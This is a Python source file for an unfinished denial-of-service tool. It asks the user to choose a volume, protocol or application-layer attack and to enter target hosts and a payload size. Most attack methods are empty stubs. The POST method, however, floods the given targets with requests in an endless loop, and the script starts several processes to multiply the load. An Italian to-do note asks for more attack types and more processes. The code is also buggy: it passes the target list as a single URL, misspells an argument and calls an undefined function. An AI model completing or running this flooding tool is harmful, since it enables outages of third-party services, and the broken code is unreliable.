import requests as res
import multiprocessing
import time

choices = [1, 2, 3]

attack_type = int(input("choose a type of attack: \n volume based attack(1), protocol attack(2), application layer attack(3)\n")) #type of attack
vector = input("target(targets):\n").split(" ") #target
bye = input("number of bytes: \n").encode() #packet size


if attack_type == choices[0]:
    subtype0 = int(input("udp_flooding(1) or ICMP(2)\n"))
    class VolumeAttack:
        if subtype0 == 1:
            def udp_flooding():
                print("first choice")
        
        else:
            def ICMP():
                pass
            
            
if attack_type == choices[1]:
    class ProtocolAttack:
        def Syn_flood():
            pass
        
        def pof():
            pass

if attack_type == choices[2]:
    class ApplicationAttack:
        def Post():
            print("using post method to: ", vector)
            print("u have 10 second to end the attack, press ctrl+c or ctrl+z")
            time.sleep(10)
            while True:
                for i in vector:
                    response = res.post(vector, data=bye, jason=None)
                    print(response.text)
            
        def Get():
            pass
        

processes = []

for i in range(5): #not 5 but 100 
    p = multiprocessing.Process(target=udp_flooding, args=(i,)) #problemm with the target, ptobably because is in a class
    processes.append(p)
    p.start()

# Wait for all processes to complete
for p in processes:
    p.join()
    
    
# TO DO LIST:
"""
oltre a scrviere lo script per gli altri tipi di attachi e quindi implementai bisogna anche fare in modo che si caposca 
quale tipo di attacco si vuole fare visto che poi quando li divido nei multi processi devo dare un target specificando la funziona
presente nella classe.
Le classi sono suddivise tra i vai tipi di attachi, le quali a  lroo volta contengono i sotto type, bisogna fare in modo che si possibile ricevere il nome 
del metodo che si sta usando, SOLO LA FUNZIONE POST è già COMPLETA, ma la si puù ancora ottimizzare
